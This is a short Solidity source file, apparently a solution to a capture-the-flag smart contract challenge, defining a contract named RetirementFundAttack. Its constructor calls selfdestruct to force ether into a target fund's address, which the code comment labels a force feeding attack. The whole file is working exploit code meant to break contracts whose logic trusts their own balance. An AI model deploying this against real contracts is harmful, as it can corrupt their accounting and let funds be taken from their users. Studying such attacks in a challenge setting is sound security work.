pragma solidity ^0.4.21;

contract RetirementFundAttack {
    function RetirementFundAttack(address fundAddress) public payable {
        // force feeding attack
        selfdestruct(fundAddress);
    }
}
